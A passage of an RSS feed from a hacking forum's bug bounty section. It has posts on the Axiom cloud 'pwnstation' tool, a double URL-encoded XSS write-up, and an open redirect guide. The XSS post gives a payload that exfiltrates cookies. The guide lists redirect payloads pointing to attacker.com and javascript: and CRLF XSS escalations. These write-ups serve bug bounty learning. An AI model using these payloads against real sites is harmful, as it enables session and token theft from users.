          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-22355</guid>
          <source url="https://0x00sec.org/t/looking-for-bug-bounty-tips-advice/22355.rss">Looking for Bug Bounty Tips/Advice</source>
        </item>
        <item>
          <title>Introducing Axiom - The Dynamic Pwnstation Orchestrator for Red Team &amp; Bug Bounty</title>
          <dc:creator><![CDATA[pry0cc]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <h1>Introducing Axiom - The Dynamic Pwnstation Orchestrator</h1>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b7a6b63e8553e457ea34b144c0ecc3d8e786537f.png" alt="https://raw.githubusercontent.com/pry0cc/axiom/master/screenshots/axiom-logo-new.png" data-base62-sha1="qcEys0icSfeSTZz7umZhsOxmJd5" width="" height=""></p>
<p>Hello, 0x00ers!</p>
<p>In this article, I’m going to discuss my new tool Axiom, a few of the concepts around the project, and some potential use cases. I’ve tried to build Axiom to be as extendable as possible so that power users can really use this new tool as an abstraction to use cloud computing systems into their workflows.</p>
<p>The repository can be found below:</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/pry0cc/axiom" target="_blank" rel="noopener">GitHub</a>
  </header>
  <article class="onebox-body">
    <span class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>

<h3><a href="https://github.com/pry0cc/axiom" target="_blank" rel="noopener">pry0cc/axiom</a></h3>

<p>The dynamic infrastructure framework for anybody! Contribute to pry0cc/axiom development by creating an account on GitHub.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Before we get into this article, if you like this creation and you appreciate the time I’ve spent developing it and refining it to give it away, please use my Digital Ocean Referral link if you’re new to DigitalOcean, this key has a $100 of free credit along with it, that’s enough to run 4 droplets for 4 months! <a href="https://m.do.co/c/bd80643300bd">https://m.do.co/c/bd80643300bd</a></p>
<p>If you already have an account, you can always buy me a coffee at:<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/d/c/dc39fb0e519a3a1af82cb21089b8421fe9c1e8ac.png" class="site-icon" width="192" height="192">
      <a href="https://www.buymeacoffee.com/pry0cc" target="_blank" rel="noopener">BuyMeACoffee</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a1048aeac4c8f338b3e001694d6cb51162f95076.jpeg" class="thumbnail" width="" height="">

<h3><a href="https://www.buymeacoffee.com/pry0cc" target="_blank" rel="noopener">pry0cc is Open Source Software, Knowledge, Sharing the love of hacking &lt;3</a></h3>

<p>Hey 👋 I do all sorts of stuff in the infosec community to try and help others and pay forward the knowledge I've learned through my experiences and years in this...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<h3>The Problem</h3>
<p>If you’re like me, you might already have a hacking VPS setup, and it will have an array of tools. It might also have a very messy scattering of different nmap files, masscan files, and general enumeration stuff. Hacking VPS’s are usually for catching shells, running port scans and hosting malware/c2.</p>
<p>Now the problem with this is:</p>
<ul>
<li>If you’re hacking and scanning a lot, you can get IP Blacklisted / Burned</li>
<li>Your budget is probably not a lot more than $5-$20 a month, so your VPS won’t be particularly powerful</li>
<li>You don’t need it a lot of the time, necessarily, you only really need it for the odd scan and shell catch, but you certainly don’t need it to run 24/7</li>
<li>You might want to give somebody access, like a coworker, but want to remove it later</li>
</ul>
<p>Until now, you could solve this problem only by spending months building an automation setup and learning all the new technologies to automate the deployment of cloud instances to do exactly what you need.</p>
<p>The good news is, I’ve done this, and I’ve packaged it up so that you don’t have to (and hopefully we’ll work together and make it better)</p>
<h3>Axiom High level</h3>
<p>Axiom has three core concepts to consider. You have instances, boxes, and images.</p>
<p>An instance is a digital ocean droplet, it is an initialized VPS hosted in Digital Ocean. This has an IP address, it can be ssh’d into, it can be deleted whenever we want.</p>
<p>An image is a snapshot of a configured DigitalOcean droplet. Axiom uses a tool known as “packer” that will initialize a new DigitalOcean droplet, run a set of predefined scripts to install tools and configure the server, and then snapshot that instance so that we can use it again. This snapshot is universally known as an image.</p>
<p>A box is a backup-lite if you like. Inside <code>~/.axiom/boxes/backup-file.txt</code> is a list of files that are to be included and excluded from backups. Simple configuration files such as vim configs, zsh history, zsh config, and the go binary directory are all backed up and restored through boxes. Inside this file also, there is wildcard “*” that specifies every file, and then a few exclusions are made (like cache directories).</p>
<p>Boxes are located at <code>~/.axiom/boxes/</code>, and  can be deleted by just deleting the folder. They can also be deleted with <code>axiom-boxes rm box</code> .</p>
<h1>Typical Axiom Workflow</h1>
<p>At a high level, this is how a typical axiom workflow would work.</p>
<h2>Manual Installation</h2>
<p>To install Axiom, you just have a few things you need to understand first. Axiom is just bash, and as such, it relies on other dependencies to actually work. This is one of the shortcomings of bash, but it is also it’s greatest strength. You can build something very quickly and publish it.</p>
<p>The key dependenices are <code>jq</code>, <code>fzf</code>, <code>doctl</code> and <code>packer</code> . The exact versions are on the GitHub, and they are important. If you use an old version  of jq, packer or doctl, it could break the entire setup. Fzf is not strictly needed but it is recommended if you’re lazy.</p>
<p>The second thing you need to is clone the git repo into <code>~/.axiom/</code>, this directory contains the entire axiom installation. Ever want to delete axiom? Just delete this directory and it’ll be gone!</p>
<p>The third thing you need to do is set up your axiom.json, this is the config file and is located in <code>~/.axiom/axiom.json</code>. This file is auto-generated by the <code>axiom-configure</code> script.</p>
<p>The fourth thing you need to do is kick off your first packer build. To do this, just run <code>axiom-build</code> .</p>
<h2>Automated Installation</h2>
<p>Now if you don’t want to install all this manually, you can run the one-liner, officially this is only supported on Ubuntu Desktop, Linux Mint, and Arch. However, it won’t get you the dependencies for Arch, you’ll have to get those yourself for now.</p>
<p>Just run this one-liner and let it do its thing. You’ll need a DigitalOcean Personal Access Token, you can generate that here:</p>
<p><a href="https://cloud.digitalocean.com/account/api/tokens">https://cloud.digitalocean.com/account/api/tokens</a></p>
<pre><code class="lang-auto">bash &lt;(curl -s https://raw.githubusercontent.com/pry0cc/axiom/master/interact/axiom-configure)
</code></pre>
<h1>Usage</h1>
<p>Once you have axiom installed and setup, you would initialize a new instance. Running <code>axiom-init</code> will start a fresh instance. You’ll notice that it will auto-select a name and a number, this is taken from an array of historical scientists and some infosec people (easter egg :)). I have intentionally made these names short and with no special characters so that it is easy to type quickly.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_12.05.13_AM" data-orig-src="upload://rmlD1XF83nSVYKzC32HSVpsjjwV.png" width="690" height="201"></p>
<p>When you initialize a new instance, Axiom will write the instance name to a ‘selection profile’, this is a JSON file inside <code>~/.axiom/profile.json</code>, this makes it easier to perform other functions such as restoring or deployment.</p>
<p>Now your instance is live, you can do several things. The first thing you might want to do is connect to it. You can run <code>axiom-ssh colden14</code> (and replace colden14 with whatever your instance was named), and it will connect you to that instance. If you try and connect too soon after init, you might get a connection refused error, but don’t worry, just wait, sometimes it takes an extra 30 seconds or so to fully boot.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_12.18.23_AM" data-orig-src="upload://nwike8ByneAEEYT3YiOtzDCZpfi.png" width="690" height="228"></p>
<p>When you first SSH in, you’ll notice that you’re dropped into a ZSH prompt.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_12.18.46_AM" data-orig-src="upload://o5irm58LFzPiEkW9YaEkeK8oEvz.png" width="690" height="478"></p>
<p>This first login will also show you your instances public IP, this can be helpful if you need to link to it.</p>
<h2>Exploring the file system.</h2>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_12.20.23_AM" data-orig-src="upload://tZ99OULiWjafIvQn6ccEDWIinTf.png" width="690" height="279"></p>
<p>Once you’re connected to your new instance, you might want to take a little look around. Let’s explain what they are now:</p>
<ul>
<li>
<p>hashes</p>
<ul>
<li>~/hashes/ contains a set of tools that help you capture hashes, typically for catching NTLM hashes over the internet, responder, smbserver, etc</li>
</ul>
</li>
<li>
<p>c2</p>
<ul>
<li>~/c2/ is empty by default, this is used for the installation of c2 with deployment profiles (to this shortly!)</li>
</ul>
</li>
<li>
<p>go/bin</p>
<ul>
<li>This directory has all your go binaries, this is in your $PATH by default and has a lot of goodies!</li>
</ul>
</li>
<li>
<p>lists</p>
<ul>
<li>This contains two of my most frequently used wordlists, Jason Haddix’s all.txt and SecLists</li>
</ul>
</li>
<li>
<p>recon</p>
<ul>
<li>This directory contains a few recon tools, DNS enumeration, email generation.</li>
</ul>
</li>
<li>
<p>work</p>
<ul>
<li>This directory is also a placeholder directory, this is where you would put your work files, or the artifacts left over from your recon. This keeps the home directory nice and tidy. I’m also writing a few enumeration scripts that work with this “work” directory.</li>
</ul>
<h2>Backing up</h2>
<p>If you’ve run a few commands and made some files, it is recommended that you place them in ~/work/. The backup feature backs up your configuration and preferences. For example, if you have made some changes to your ZSH setup, such as a theme, it will be backed up. All you have to do to back up this instance using the <code>axiom-backup colden-14.</code></p>
</li>
</ul>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_12.28.23_AM" data-orig-src="upload://7RUaA6t24D4LBAqiJHh7pHhJcgZ.png" width="690" height="226"></p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_12.28.34_AM" data-orig-src="upload://jGslO5frYsdgXBCkMuYxrVqmSR2.png" width="517" height="189"></p>
<p>This script basically does a select rsync on the home directory, this includes some dotfiles. You can change which files get included in the backup/restore progress by editing <code>~/.axiom/boxes/backup-files.txt</code>.</p>
<p>As we have backed up <code>colden14</code>, these files will be present in <code>~/.axiom/boxes/colden14</code>. If we want to see the files, interact and/or edit them, we can use the command <code>axiom-boxes cd colden14</code> to enter into that directory.</p>
<p>Now, we can safely kill the instance. To do so, we use the command <code>axiom-rm colden14</code>.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_12.31.29_AM" data-orig-src="upload://eKxVpJ5xrWljDBilLg8Z3AxqKWC.png" width="690" height="164"></p>
<p>This may take a few moments, but when it is complete, our colden14 instance will be completely deleted. We are no longer being billed for this, and it has no presence on the internet any longer. Any data we had on that instance that we did not backup has now been lost forever. Nice.</p>
<p>Now, we can initialize and restore a new instance. I added in a cheeky bit of shorthand to help the process so you can use just one command. <code>axiom-init --restore=colden14</code> will do the heavy lifting for us.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_12.33.43_AM" data-orig-src="upload://r9sobmuzmsd3SPB0d6ARgbzlcmU.png" width="690" height="180"></p>
<p>Once this new instance <code>kilby19</code> is initialized, it will wait 65 seconds for all the services to come up, and then it will trigger the restoration of our backup.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_12.34.47_AM" data-orig-src="upload://n1Eb6IWKLoivIi7VdxJBOsjMaPk.png" width="690" height="202"><br>
<img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_12.36.05_AM" data-orig-src="upload://cN53UDf40H8q1A07WSwyA7G5Qtz.png" width="690" height="219"></p>
<p>Now that our <code>kilby19</code> has been restored with the <code>colden14</code> backup, we can connect to it and it will maintain our changes! How awesome is that!</p>
<p>If we wanted to, we could turn this into a one liner. Try this:</p>
<pre><code class="lang-auto">alias moto="axiom-init moto --restore=moto &amp;&amp; axiom-ssh moto --tmux &amp;&amp; axiom-backup moto &amp;&amp; axiom-rm moto -f"
</code></pre>
<p>And run <code>moto</code>.</p>
<p>This will initialize an instance, called moto, restore from the last moto backup, ssh into moto, and then connect to a tmux session. Once your tmux session ends, aka you detach from it, it will run an axiom-backup against it and delete it. Next time you want to spin up and connect to moto, you just run <code>moto</code> again.</p>
<p>This is illustrative of the power of Axiom. You can script all sorts of operations around instances and refer to them by name (without having to care about their ports and IP’s).</p>
<h1>Advanced Usage</h1>
<p>Some of the more advanced commands are <code>axiom-deploy</code>, <code>axiom-vpn</code>, and <code>axiom-boxes</code>.</p>
<h2>Quick Deployment</h2>
<p>If you recall earlier when you initialize a new machine it “remembers” the name of the last instance you spun up. As such, commands like <code>axiom-deploy</code>  allow you to omit the instance name and assume that you’re talking about the last server you spun up. If you don’t want to refer to the instance you just spun up, you can use <code>axiom-select name</code> to change your profile selection.</p>
<p>To deploy a profile, you just need to run <code>axiom-deploy profilename</code> and it will deploy whatever profile you specify, at the time of writing profiles include:</p>
<ul>
<li>OpenVPN Server</li>
<li>Covenant C2 Platform</li>
</ul>
<p>To deploy an OpenVPN Server, we can just run <code>axiom-deploy openvpn</code>.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_12.46.28_AM" data-orig-src="upload://yCMVmSyqIqi87tl8Utd11GZwY4f.png" width="690" height="263"></p>
<p>This will connect to <code>kilby19</code>, and run a set of commands to install and setup OpenVPN. As we’re all using the same base image, we can package these little scripts together so that they’re universal between all axiom users. If you’d like to write an axiom deployment profile, please refer to the <code>~/.axiom/profiles/openvpn/manifest.json</code> to get an idea of how it works! Just copy the OpenVPN file and edit the manifest, and you’re off the races!</p>
<h3>Connecting</h3>
<p>In the previous step, we deployed OpenVPN using a deployment profile with the <code>axiom-deploy openvpn</code> command. But now we need to connect to it? To connect and route all your traffic through this instance, just run <code>axiom-vpn kilby19</code>,  of course replacing kilby19 with whatever your instance is called. This will download the client  OpenVPN configuration and start openvpn client with it. It will ask for your sudo password to start.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_12.50.13_AM" data-orig-src="upload://aeF7BYudK3AHXcyD9QZeJVufx6Z.png" width="690" height="249"></p>
<h2>Managing Axiom-boxes</h2>
<p>The <code>axiom-boxes</code> command is a utility that lets us manage our boxes. To first see what boxes we  have available, run <code>axiom-boxes ls</code></p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_12.52.01_AM" data-orig-src="upload://d6IMxYlpKbgzQmB99KRR1ugk4YM.png" width="690" height="451"></p>
<p>For me, I have quite a few boxes. These are from previous backups and other machines I have used in the past. One of these is pry0cc-lazy, which is a public axiom box I maintain. pry0cc/lazy contains an enumeration script that empowers you to perform automated enumeration against a domain name.</p>
<p>This script is more of a PoC of what Axiom boxes are able of doing, but we’ll show it off now.</p>
<p>To pull a new box, use my example box, run the command <code>axiom-boxes get pry0cc/lazy</code>.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_12.56.14_AM" data-orig-src="upload://eexYOUGph6inAeKZlXSWW2q3u5P.png" width="690" height="238"></p>
<p>This will clone my lazy box. Want to try it out? Just start a new instance and restore from it.</p>
<pre><code class="lang-auto">axiom-init --restore=pry0cc/lazy
</code></pre>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_12.57.09_AM" data-orig-src="upload://cFDozTpKahPzItdGt8eH7Q50X64.png" width="690" height="217"></p>
<p>Once restored, initialized, and connected to, we can run the <code>lazy.sh &lt;domain&gt;</code> and it will run our automated enumeration for us.</p>
<p>Once we’ve run that, we can exit and run <code>axiom-backup noyce20</code>  on that instance, delete it, and inspect the results in <code>~/.axiom/boxes/noyce20/</code> using <code>axiom-boxes cd noyce20</code></p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Screen_Shot_2020-06-17_at_1.00.29_AM" data-orig-src="upload://toOD9SVUxUSTJzzveSFDuIGmjW6.png" width="690" height="464"></p>
<h1>Conclusion</h1>
<p>I’ve gone through a few cool things you can do to get set up and going! Hopefully, I explained everything satisfactorily here! If you have any questions, drop a comment and I’ll be happy to help! If you liked, this please share this article or <a href="https://www.buymeacoffee.com/pry0cc">whatever you feel like</a>!</p>
<p>Stay Snappy!</p>
            <p><small>20 posts - 9 participants</small></p>
            <p><a href="https://0x00sec.org/t/introducing-axiom-the-dynamic-pwnstation-orchestrator-for-red-team-bug-bounty/21824">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/introducing-axiom-the-dynamic-pwnstation-orchestrator-for-red-team-bug-bounty/21824</link>
          <pubDate>Wed, 17 Jun 2020 23:46:06 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-21824</guid>
          <source url="https://0x00sec.org/t/introducing-axiom-the-dynamic-pwnstation-orchestrator-for-red-team-bug-bounty/21824.rss">Introducing Axiom - The Dynamic Pwnstation Orchestrator for Red Team &amp; Bug Bounty</source>
        </item>
        <item>
          <title>Bug Bounty in 2020 - Some Thoughts [Discussion]</title>
          <dc:creator><![CDATA[pry0cc]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <p>Hello, 0x00ers!</p>
<p>This is something that has been on my mind the past few weeks, and it’s concerning the topic of utilizing methodologies that are common in the bug bounty arena in domestic penetration testing. Especially when it comes to very high and open scope tests that may have a large number of assets.</p>
<p>Typically as a penetration tester, your goal is to 1. Get in, and 2. Identify as many different potential ways of getting in. That may include any number of vulnerabilities.</p>
<p>Some bug bounty methodology techniques such as performing site-wide screenshots, automating the download of all detected javascript files, and scraping them for secrets by regex.</p>
<p>I see a lot of automation and continuous scanning solutions come out of this revolution known as the bug bounty community. I honestly feel as if some of the best, highest motivation hackers are in the bug bounty space. Innovation has been bred out of the reward of a bounty. Personally I am developing a solution revolving around automated enumeration (and then further diffing, or tracking the changes between scans).</p>
<p>I was watching some of the conference talks at NahamCon today, and one thing I noticed was that feeling of awe that I felt when I first started out in security, that feeling of “wow these people are on another level”. I really feel the bug bounty community right now will be remembered in history for what it has done to open the gates to those with the merit to receive the rewards.</p>
<p>Mostly for me, it is the community. Twitter is extremely active with bug bounty hunters that share their tools and knowledge continuously.</p>
<p>What are your thoughts? Have you had a chance yet to peek into what the people in the bug bounty circles are doing? Do you think it has any significance? Let me know!</p>
            <p><small>8 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/bug-bounty-in-2020-some-thoughts-discussion/21761">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/bug-bounty-in-2020-some-thoughts-discussion/21761</link>
          <pubDate>Sat, 13 Jun 2020 22:56:52 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-21761</guid>
          <source url="https://0x00sec.org/t/bug-bounty-in-2020-some-thoughts-discussion/21761.rss">Bug Bounty in 2020 - Some Thoughts [Discussion]</source>
        </item>
        <item>
          <title>NahamsecCon hosted on Twitch</title>
          <dc:creator><![CDATA[c0z]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <p>Nahamsec started hosting a CTF this morning and started hosting speakers on <a href="https://www.twitch.tv/nahamsec" rel="noopener nofollow ugc">twitch</a>. Please stop by for a good time <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
            <p><small>14 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/nahamseccon-hosted-on-twitch/21756">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/nahamseccon-hosted-on-twitch/21756</link>
          <pubDate>Sat, 13 Jun 2020 17:17:05 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-21756</guid>
          <source url="https://0x00sec.org/t/nahamseccon-hosted-on-twitch/21756.rss">NahamsecCon hosted on Twitch</source>
        </item>
        <item>
          <title>Double URL-encoded XSS</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <p>Right after the quarantine ended I had a mini burn out for more than a month, where I didn’t even bother to try and hunt for bugs. After those one and a half months of trying to find my motivation again, I found a XSS that required a bit more thinking than the typical <code>javascript:alert(1)</code> cases.</p>
<p>Revisiting my old notes from a BB program, I observed an endpoint that I tried to exploit the last time, before I go through that burn out. Back then I wasn’t able to exploit it, so now I thought I’d give it a second chance. The endpoint was <code>https://example.com/dir/legacy-browser?redir=/</code>. There was a button, where you would get redirected to the endpoint the paramteter redir was pointing. Analyzing the source code, I could see that the website was redirecting the user this way:</p>
<p><span alt="double_url_xss" data-base62-sha1="m8yTjozXcodwQrmbIrzY0PDD8nx" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>At first, I thought that this should be easy. I tried escaping the parenthesis by injecting <code>')</code> in the <code>redir</code> parameter. The result was that the illegal characters would be removed. Actually, if there was any illegal characters, the app would redirect you by default to <code>/</code>.</p>
<p>I tried to inject a null byte <code>%00</code>, just to see how the app would react. The app translated the null byte into <code>NULL</code>. So the payload <code>redir=/%00/</code> would get reflected into the source code as <code>javascript:redirect('/NULL/')</code>. I thought “great, the url encoded characters are getting decoded”. I clicked the button and… I got redirected to <code>/NULL/</code>. Also, any other illegal url encoded characters would be removed, just as I described previously.</p>
<p>So, apparently, the URL was getting decoded and sent to <code>javascript:redirect()</code>. But I wanted to inject some illegal characters to escape the parenthesis. After some thought, I came to the conclusion that in orded to send illegal characters to <code>javascript:redirect()</code>, those characters had to be URL-encoded, after they have been decoded from the URL bar. Hence the double URL encoding!</p>
<p>I sent the second payload <code>https://www.example.com/dir/legacy-browser?redir=/%2500/test</code>, where <code>%2500</code> is the double-URL-encoded null byte. The result was for <code>javascript:redirect('/%00/test')</code> to get reflected. After hitting the button, I got redirected to <code>https://example.com/</code>, meaning that the null byte in <code>javascript:redirect()</code> was actually getting decoded. So I could actually send working double URL encoded payloads.</p>
<p>Having this in my mind, I crafted a payload for this endpoint (and by crafting, I mean copying and pasting the XSS payload from <a href="https://twitter.com/brutelogic">brutelogic</a> in <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection">PayloadsAllTheThings</a> and adding a <code>')</code> in front). I double URL-encoded it and injected it into the parameter. And after hitting the button, the XSS was getting triggered, right before the user got redirected to <code>/</code>.</p>
<p>Final exploit: <code>https://example.com/enpoint?redir=/%2527)%253B%2520alert(document.cookies)%253B%252F%252F</code></p>
<h2>tl;dr</h2>
<p><span alt="carbon" data-base62-sha1="4afrLu9DGIm0CYvPuNmKuq62FaN" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/double-url-encoded-xss/21574">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/double-url-encoded-xss/21574</link>
          <pubDate>Wed, 03 Jun 2020 09:55:06 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-21574</guid>
          <source url="https://0x00sec.org/t/double-url-encoded-xss/21574.rss">Double URL-encoded XSS</source>
        </item>
        <item>
          <title>Open Redirection Guide</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <h2>Identifing possible vulnerable endpoints:</h2>
<ul>
<li>
<p><a href="https://github.com/lc/gau">gau</a> or <a href="https://github.com/tomnomnom/waybackurls">waybackurls</a> + <a href="https://github.com/hakluke/hakrawler">hakrawler</a> + <a href="https://github.com/tomnomnom/gf">gf</a></p>
<p><em>1</em>. <code>cat subdomains | gau | tee -a urls</code><br>
<em>2</em>. <code>cat subdomains | hakrawler -depth 3 -plain | tee -a urls</code><br>
<em>3</em>. <code>gf redirect urls</code></p>
<p>using <code>redirect.json</code> with <code>gf</code>:</p>
</li>
</ul>
<pre><code class="lang-json">{
    "flags" : "-HanrE",
    "pattern" : "url=|rt=|cgi-bin/redirect.cgi|continue=|dest=|destination=|go=|out=|redir=|redirect_uri=|redirect_url=|return=|return_path=|returnTo=|rurl=|target=|view=|from_url=|load_url=|file_url=|page_url=|file_name=|page=|folder=|folder_url=|login_url=|img_url=|return_url=|return_to=|next=|redirect=|redirect_to=|logout=|checkout=|checkout_url=|goto=|next_page=|file=|load_file=|turl="
}
</code></pre>
<ul>
<li>Google dorks<br>
<code>site:domain.com inurl:[PARAMETER]</code> using a <a href="https://github.com/victoni/Bug-Bounty-Scripts/blob/master/lists/open_redirection_parameters.txt">parameter list</a>
</li>
<li>Manual inspection by navigating the webapp and intercepting the requests</li>
</ul>
<h2>Confirm and exploit:</h2>
<pre><code class="lang-nohighlight">* https://company.com/?redirect=http://attacker.com
* https://company.com/?redirect=http://company.com.attacker.com
* https://company.com/?redirect=https://company.com@attacker.com
* https://company.com/?redirect=//attacker.com
* https://company.com/?redirect=\/\/attacker.com
* https://company.com/?redirect=http://attacker.com#company.com
* https://company.com/?redirect=http://attacker.com?company.com
* https://company.com/?redirect=http://attacker.com/company.com
* https://company.com/?redirect=http://ⓐⓣⓣⓐⓒⓚⓔⓡ.ⓒⓞⓜ

If you found a POST-based request vulnerable to open redirection,
try to turn it into a GET request by appending the POST parameters
to the URL as GET parameters.

Using special characters:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 。
</code></pre>
<p><a href="https://twitter.com/hahwul">Special characters’ source</a></p>
<h2>Escalating to other vulnerabilities:</h2>
<pre><code class="lang-auto">Open Redirect + Miconfigured OAuth App =&gt; OAuth Token Stealing
Open Redirect + Filtered SSRF =&gt; SSRF
Open Redirect + CRLFi =&gt; XSS
Open Redirect + javascript URI =&gt; XSS
</code></pre>
<p><a href="https://twitter.com/LooseSecurity/status/1120638007760117760">Source</a><br>
<br>
Escalate to XSS</p>
<ul>
<li><code> https://company.com/?redirect=javascript:alert(1)</code></li>
<li><code> https://company.com/?redirect=javascript:prompt(1)</code></li>
</ul>
<p>Escalate to XSS using CRLFi</p>
<ul>
<li><code>https://company.com/?redirect=java%0d%0ascript%0d%0a:alert(0)</code></li>
</ul>
            <p><small>14 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/open-redirection-guide/21118">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/open-redirection-guide/21118</link>
          <pubDate>Sun, 10 May 2020 20:08:35 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-21118</guid>
          <source url="https://0x00sec.org/t/open-redirection-guide/21118.rss">Open Redirection Guide</source>
        </item>
        <item>
          <title>Unrestricted CV File Upload</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <p>While I’m stuck at quarantine like the rest of the world, I have more time to work on my web app hacking skills by doing some bug bounties. From those bugs that I found in this long BB session of mine, I got to report my first Unrestricted File Upload.<br>
OWASP explains the vulnerability in great detail <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">here</a>.</p>
<p>So the functionality of the service goes like that: a user can upload their CV on the website. The web app renames and saves the file, which is going to be examined later by an employee of the company on their computer locally. After examining the file, the employee will update the user’s profile based on the info of the CV.</p>
<h6>Source: OWASP</h6>
<p><span alt="screenshot" data-base62-sha1="cyBsZyAayfKaFjew0XAydkJ6A85" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
